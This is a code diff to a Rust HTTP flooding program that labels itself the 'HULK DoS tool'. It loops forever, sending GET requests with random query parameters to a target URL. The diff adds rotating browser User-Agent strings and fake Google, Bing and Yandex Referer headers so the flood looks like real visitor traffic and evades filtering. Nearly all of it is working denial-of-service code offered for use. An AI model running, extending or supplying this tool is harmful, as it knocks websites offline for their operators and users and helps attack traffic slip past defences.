@@ -1,5 +1,5 @@
 use clap::Parser;
-use hyper::{Client, Uri};
+use hyper::{Client, Request, Body};
 use hyper::body::HttpBody as _;
 use rand::{thread_rng, Rng};
 use rand::distributions::Alphanumeric;
@@ -11,6 +11,25 @@ use std::io::Write;
 
 static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
 static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);
+static USER_AGENTS: &'static [&'static str] = &[
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
+    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
+    ];
+static REFERERS: &'static [&'static str] = &[
+    "https://www.google.com/?q=",
+    "https://bing.com/search?q=",
+    "https://yandex.ru/yandsearch?text=",
+    ];
 
 #[derive(Parser, Debug)]
 #[clap(author = "Hexalyse", about = "HULK DoS tool")]
@@ -56,11 +75,16 @@ async fn fetch_url(target: String, verbose: bool, _thread: usize) -> Result<(), 
     let https = HttpsConnector::new();
     let client = Client::builder()
         .build::<_, hyper::Body>(https);
+
     loop {
-        // if url already contains a ?, we need to add a & to the end of the query string instead of a ?
-        let uri_string = format!("{}?{}={}", target, random_string(10), random_string(10));
-        let uri = uri_string.parse::<Uri>()?;
-        let mut resp = client.get(uri).await?;
+        let uri = if target.contains("?") { format!("{}&{}={}", target, random_string(10), random_string(10)) } else { format!("{}?{}={}", target, random_string(10), random_string(10)) };
+        let referer = format!("{}{}", REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())], random_string(rand::thread_rng().gen_range(5..10)));
+        let request = Request::get(uri)
+            .header("User-Agent", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())])
+            .header("Referer", referer)
+            .body(Body::empty())?;
+
+        let mut resp = client.request(request).await?;
         if resp.status() != hyper::StatusCode::OK {
             if verbose {
                 println!("\n[!] Error: {}", resp.status());
@@ -75,6 +99,7 @@ async fn fetch_url(target: String, verbose: bool, _thread: usize) -> Result<(), 
             print!("\r[*] {} requests | {} OK | {} errors", total_reqs, ok_count, err_count);
             io::stdout().flush().unwrap();
         }
+        
         resp.body_mut().data().await;
     }
 }
